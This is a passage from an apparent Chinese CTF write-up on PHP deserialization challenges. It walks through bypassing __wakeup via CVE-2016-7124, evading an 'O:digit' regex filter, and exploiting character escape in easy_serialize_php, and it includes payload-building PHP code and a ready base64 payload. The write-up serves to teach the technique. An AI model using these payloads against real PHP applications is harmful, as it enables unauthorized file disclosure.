class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过上述代码，得到序列化的对象。</p><pre class="line-numbers language-none"><code class="language-none">O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>我们不想调用__wakeup()，所以我们可以将上述语句进行修改使其不正确，譬如将变量个数1改为2。此时，只会调用析构方法，而不调用苏醒方法。</p><blockquote><p>绕过__wakeup()是利用CVE-2016-7124漏洞，即反序列化时，如果表示对象属性个数的值大于真实的属性个数时就会跳过__wakeup( )的执行。<br>影响版本：</p></blockquote><blockquote><p>PHP before 5.6.25<br>7.x before 7.0.10</p></blockquote><p>最终payload为</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload"><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Web-php-unserialize"><a href="#Web-php-unserialize" class="headerlink" title="Web_php_unserialize"></a>Web_php_unserialize</h2><h3 id="信息搜集-1"><a href="#信息搜集-1" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>进入页面得到源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">Demo</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">private</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">echo</span> @<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>             <span class="token comment">//the secret is in the fl4g.php</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>     <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token variable">$var</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[oc]:\d+:/i'</span><span class="token punctuation">,</span> <span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'stop hacking!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>     <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><p>首先，将代码走一遍。</p><ol><li><p>传入参数，将参数base64解码，使用正则表达式过滤。</p></li><li><p>进入反序列化，如果正常进入反序列化，则调用苏醒方法。如果属性$file != index.php，便会强制转换为index.php。同时，这里的注释显示flag在fl4g.php中。</p></li><li><p>之后进入析构方法，会显示file属性指向的文件。</p></li></ol><p>从上面的分析我们可以清楚的看出，如果想要得到flag，我们需要将file属性变为fl4g.php。但是，如果调用苏醒方法，又会将file变回index.php。所以，我们不能去调用它。不调用的方式，我们可以从上题可以知道，改变属性的个数即可。</p><p>而反序列化之前会进行一个过滤，这个过滤的含义为</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;[oc]:\d+:&#x2F;i匹配下列列表中的一个单字符 [oc]oc matches a single character in the list oc (不区分大小写)o matches the character o with index 11110 (6F16 or 1578) literally (不区分大小写)c matches the character c with index 9910 (6316 or 1438) literally (不区分大小写): matches the character : with index 5810 (3A16 or 728) literally (不区分大小写)\d matches a digit (equivalent to [0-9])+ matches the previous token between 1 and 无穷 times, 尽可能多匹配，如果有必要，回溯匹配更少内容 (贪婪模式): matches the character : with index 5810 (3A16 or 728) literally (不区分大小写)Global pattern flagsi 修改: insensitive. Case insensitive match (ignores case of [a-zA-Z])<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>即，匹配O:数字:，也就是如果正常的序列化字符串，在这里会被过滤。我们只需要再:与数字之间加空格即可。</p><h3 id="payload构造"><a href="#payload构造" class="headerlink" title="payload构造"></a>payload构造</h3><p>在构造payload前需要主要一件事</p><blockquote><p>这里有个坑，这里的 file 变量为私有变量，所以序列化之后的字符串开头结尾各有一个空白字符（即%00），字符串长度也比实际长度大 2，如果将序列化结果复制到在线的 base64 网站进行编码可能就会丢掉空白字符，所以这里直接在php 代码里进行编码。类似的还有 protected 类型的变量，序列化之后字符串首部会加上%00*%00。</p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">Demo</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">private</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">echo</span> @<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>             <span class="token comment">//the secret is in the fl4g.php</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>     <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token variable">$var</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Demo</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'fl4g.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$var</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$var</span><span class="token punctuation">;</span><span class="token variable">$var</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'O:4'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'O: 4'</span><span class="token punctuation">,</span><span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//绕过preg_match</span><span class="token variable">$var</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">':1:'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">':2:'</span><span class="token punctuation">,</span><span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//绕过wakeup</span><span class="token keyword">echo</span> <span class="token variable">$var</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行上述代码即可。</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?var &#x3D; TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="easy-serialize-php"><a href="#easy-serialize-php" class="headerlink" title="easy_serialize_php"></a>easy_serialize_php</h2><h3 id="信息搜集-2"><a href="#信息搜集-2" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>进入页面，打开code.php 即可查看源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$function</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$filter_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'php5'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'php4'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'fl1g'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span><span class="token variable">$filter_arr</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'/i'</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"user"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'guest'</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'function'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$function</span><span class="token punctuation">;</span><span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$function</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;a href="index.php?f=highlight_file">source_code&lt;/a>'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'guest_img.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$serialize_info</span> <span class="token operator">=</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'highlight_file'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'phpinfo'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'phpinfo();'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//maybe you can find something in here!</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'show_image'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$userinfo</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$serialize_info</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$userinfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="思路分析-1"><a href="#思路分析-1" class="headerlink" title="思路分析"></a>思路分析</h3><h4 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h4><ol><li><p>以GET方式传入参数f，赋值给$function</p></li><li><p>如果有session，则将其销毁</p></li><li><p>重新设置session，session[“user”]设置为guest，session[‘funcation’]设置为$function。即，参数f</p></li></ol><pre class="line-numbers language-none"><code class="language-none">$_SESSION[&quot;user&quot;] &#x3D; &#39;guest&#39;;$_SESSION[&#39;function&#39;] &#x3D; $function;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="4"><li><p>extract($_POST); 这个语句的作用是将POST上传的数组展开，以便直接利用</p></li><li><p>如果get上传的没有img_path参数，将session[‘img_path’]设置为进过base64加密的guest_img.png。反之，则将其在设置为经过base64编码和sha1哈希后的img_path参数值。</p></li></ol><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'guest_img.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="6"><li>调用filter函数，参数是经过序列化的session</li></ol><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$serialize_info</span> <span class="token operator">=</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="7"><li>将传入的序列化的session进行正则表达式匹配，匹配的为php，flag，php5，php4，fl1g，并不区分大小写。将匹配项替换为空。</li></ol><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$filter_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'php5'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'php4'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'fl1g'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span><span class="token variable">$filter_arr</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'/i'</span><span class="token punctuation">;</span>    <span class="token comment">// 用 glue 将一维数组的值连接为一个字符串。</span>    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="8"><li>如果传入的参数f的值为highlight_file，显示源码。如果为phpinfo，显示phpinfo。如果为show_image，就将刚才过滤后的结果进行反序列化，并将文件base64解码，输出内容。</li></ol><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'highlight_file'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'phpinfo'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'phpinfo();'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//maybe you can find something in here!</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'show_image'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$userinfo</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$serialize_info</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$userinfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="思路详解"><a href="#思路详解" class="headerlink" title="思路详解"></a>思路详解</h4><p>我们从第8的注释里看到，有隐藏信息在phpinfo中，因而我们可以进行查看。发现有flag文件，d0g3_f1ag.php<br><img src="1.png"></p><p>那么，我们的目的就很明确了，输出这个文件的内容，而8中有一个file_get_contents函数可以输出变量’img’参数所代表的文件。于是，我们向上寻找$serialize_info。</p><p>找到6，还没用，继续向上。发现如果img没有指定，那么会对’guest_img.png’进行base64加密。但如果指定了又会被hash，所以我们好像进入死胡同。其实不然，看似没有太大用的6其实就是我们的突破点。</p><p>6中会将指定的字符换为空，这里就会影响反序列化的判断，所以就可以利用序列化与反序列化的一些知识，进行攻克。</p><h3 id="php反序列化字符逃逸"><a href="#php反序列化字符逃逸" class="headerlink" title="php反序列化字符逃逸"></a>php反序列化字符逃逸</h3><h4 id="特点1"><a href="#特点1" class="headerlink" title="特点1"></a>特点1</h4><p>在php中，反序列化的过程中必须严格按照序列化规则才能成功实现反序列化，例如：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$str</span><span class="token operator">=</span><span class="token string single-quoted-string">'a:2:&#123;i:0;s:8:"Hed9eh0g";i:1;s:5:"aaaaa";&#125;'</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出结果</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=></span> <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"Hed9eh0g"</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=></span> <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"aaaaa"</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>一般来说，我们对序列化的结果进行增删改查，特别是字符串名、数组名的长度修改都会造成错误。</p><p>但是，如果在花括号之后呢？</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$str</span><span class="token operator">=</span><span class="token string single-quoted-string">'a:2:&#123;i:0;s:8:"Hed9eh0g";i:1;s:5:"aaaaa";&#125;awr'</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果为</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=></span> <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"Hed9eh0g"</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=></span> <span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"aaaaa"</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>仍然可以输出上面的结果，这说明反序列化的过程是有一定识别范围的，在这个范围之外的字符(第二个例子里的abc)都会被忽略，不影响反序列化的正常进行。</p><h4 id="特点2"><a href="#特点2" class="headerlink" title="特点2"></a>特点2</h4><p>例子：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"user"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'flagflagflagflagflagflag'</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"function"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"dd";s:1:"a";&#125;'</span><span class="token punctuation">;</span> <span class="token comment">// d0g3_f1ag.php</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"img"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'L2QwZzNfZmxsbGxsbGFn'</span><span class="token punctuation">;</span>                                             <span class="token comment">// /d0g3_fllllllag</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果为：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">a<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token 